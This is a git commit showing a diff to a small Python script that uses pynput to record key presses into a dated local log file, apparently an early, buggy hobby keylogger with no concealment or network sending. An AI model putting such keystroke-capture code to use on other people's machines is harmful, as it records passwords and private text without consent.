7859f9ac469be83ba3891308c8acaa0ab18fb524
SlinkyShelf <77686856+SlinkyShelf@users.noreply.github.com>
2022-01-27 22:20:44 -0600

    it might work now???

--- main.py
+++ main.py
@@ -1,50 +1,48 @@
 from time import sleep, time
 from pynput import keyboard, mouse
 from datetime import date
-import os 
+import sys
 
 day = date.today()
 charsperline = 1
 
 logpath = "./logs/"+str(day)+".txt"
 
-# if os.path.exists(logpath):
-#     open(logpath, "x")
-
 
 writer = ""
-with open(logpath, "a") as w:
-    writer = w
-
-if not writer:
-    quit()
-
-currentcharcount = 0
-currentline = ""
-def onkeypress(keyevent):
-    try:
-        if keyevent.char == "s":
-            writer.close()
-            quit()
-
-        global currentcharcount
-        global currentline
-        key = keyevent.char
-        if currentcharcount+len(key) > charsperline:
-            currentcharcount = 0
-            print("writeline", currentline)
-            writer.write(currentline)
-            currentline = ""
-
-        currentline += key
-        currentcharcount += len(key)
-
-    except:
-        _ = ""
+with open(logpath, "a") as writer:
+    currentcharcount = 0
+    currentline = ""
 
 
-listener = keyboard.Listener(on_press = onkeypress)
-listener.start()
+    def write():
+        writer.write(currentline)
+        print("wrote")
 
-while True:
-    sleep(1)
+
+    def onkeypress(keyevent):
+        try:
+            if keyevent.char == "s":
+                writer.close()
+                sys.exit()
+
+            global currentcharcount
+            global currentline
+            key = keyevent.char
+            if currentcharcount+len(key) > charsperline:
+                write()
+                currentcharcount = 0
+                currentline = ""
+
+            currentline += key
+            currentcharcount += len(key)
+
+        except:
+            _ = ""
+
+
+    listener = keyboard.Listener(on_press=onkeypress)
+    listener.start()
+
+    # while True:
+    #     sleep(1)
